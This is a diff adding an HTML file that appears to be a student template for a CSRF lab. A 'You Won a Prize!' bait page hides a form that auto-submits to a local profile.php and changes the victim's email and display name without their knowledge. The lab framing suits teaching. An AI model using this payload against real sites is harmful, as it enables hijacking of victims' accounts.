@@ -1,0 +1,65 @@
+<!--
+  FILE: csrf_attack.html
+  PURPOSE: Template for CSRF attack demonstration
+  INSTRUCTIONS: Students modify this file to craft a CSRF payload
+  that auto-submits a form to change the victim's profile.
+  
+  Open this file in your browser while the victim (alice) has
+  an active session on the SecureCorp lab. The hidden form will
+  automatically submit to profile.php, changing her email.
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>You Won a Prize!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #1a1a2e;
+            color: #eee;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .bait {
+            background: #16213e;
+            border: 2px solid #e94560;
+            border-radius: 12px;
+            padding: 40px;
+            text-align: center;
+            max-width: 500px;
+        }
+        .bait h1 { color: #e94560; font-size: 28px; margin-bottom: 10px; }
+        .bait p { color: #aaa; font-size: 16px; }
+    </style>
+</head>
+<body>
+    <div class="bait">
+        <h1>🎉 Congratulations!</h1>
+        <p>You have been selected for a special reward. Please wait while we process your prize...</p>
+    </div>
+
+    <!--
+        !!! CSRF ATTACK PAYLOAD !!!
+        This hidden form auto-submits to the vulnerable profile.php endpoint.
+        The victim's email and display name are changed without their knowledge.
+        
+        TODO (Student): Modify the values below to demonstrate the attack.
+        Change the "action" URL to match your local XAMPP setup if needed.
+    -->
+    <form id="csrf_form" method="POST" action="http://localhost/sqli_lab/profile.php" style="display:none;">
+        <input type="hidden" name="email" value="hacked@evil-attacker.com">
+        <input type="hidden" name="display_name" value="HACKED_BY_CSRF">
+    </form>
+
+    <script>
+        // Auto-submit the hidden form after a short delay
+        setTimeout(function() {
+            document.getElementById('csrf_form').submit();
+        }, 1500);
+    </script>
+</body>
+</html>
